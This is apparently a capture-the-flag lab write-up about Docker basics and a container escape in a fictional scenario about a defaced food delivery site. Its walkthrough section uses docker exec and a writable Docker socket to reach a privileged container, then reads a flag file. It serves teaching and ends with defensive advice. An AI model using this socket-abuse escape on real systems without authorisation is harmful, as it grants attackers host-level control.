
# Containers - DoorDasher's Demise

## Scenario Overview
- DoorDasher (local food delivery service in Wareville) was defaced and rebranded as **Hopperoo** by King Malhare.
- Customers reported food replaced with strands of Santa’s beard (“Beardgate”).
- A security engineer created a recovery script but was locked out.
- SOC team still has access via an **uptime-checker container**.
- Goal: **escape the container, escalate privileges, and restore DoorDasher**.

---

## Learning Objectives
- Understand containers vs virtual machines
- Learn Docker concepts: images, layers, engine, daemon, sockets
- Identify common container escape and privilege escalation vectors
- Investigate Docker layers and restore a compromised service

---

## Containers Explained
### Problems Containers Solve
- Installation quirks across environments
- Troubleshooting environment vs application issues
- Dependency/version conflicts

### What is a Container?
- Isolated package of an application + dependencies
- Shares host OS kernel
- Lightweight and fast to start

---

## Containers vs Virtual Machines
- **VMs**
  - Run on a hypervisor
  - Include a full guest OS
  - Heavy but strongly isolated
- **Containers**
  - Share host OS kernel
  - Isolate only application + dependencies
  - Lightweight and ideal for microservices

---

## Applications at Scale
- Shift from monolithic apps to **microservices**
- Individual services can be scaled independently
- Containers are ideal due to fast startup and low overhead

---

## Docker Basics
- Docker = container engine used by DoorDasher
- Uses Dockerfiles to define environments
- Client-server model:
  - Docker CLI (client)
  - Docker daemon (server)
- Communication via **Unix socket** (`/var/run/docker.sock`)

---

## Container Escape & Docker Socket Abuse
- **Container escape**: gaining access beyond container isolation
- Docker exposes an API via a Unix socket
- If a container has access to `/var/run/docker.sock`, it can:
  - Control Docker daemon
  - Spawn privileged containers
  - Effectively gain host-level access

---

## Challenge Walkthrough

### 1. Enumerate Running Containers
```bash
docker ps
```
- Identify main web service (Hopperoo / DoorDasher)
- Note uptime-checker container

### 2. Access Uptime Checker Container
```bash
docker exec -it uptime-checker sh
```

### 3. Check Docker Socket Access
```bash
ls -la /var/run/docker.sock
```
- Writable socket = high-risk misconfiguration

### 4. Confirm Docker API Access
```bash
docker ps
```
- If successful, Docker escape is possible

### 5. Access Privileged Deployer Container
```bash
docker exec -it deployer bash
```
```bash
whoami
```
- Explore filesystem and locate flag

---

## Restoring the Application
- Recovery script located in root directory (`/`)
- Run with sudo:
```bash
sudo /recovery_script.sh
```
- Refresh site: http://10.48.142.85:5001
- DoorDasher is restored

---

## Final Flag
- Located in `/` directory
```bash
cat /flag
```

---

## Key Security Takeaways
- Never expose Docker socket to untrusted containers
- Docker socket access == root-level control
- Use Enhanced Container Isolation where possible
- Monitor privileged containers closely
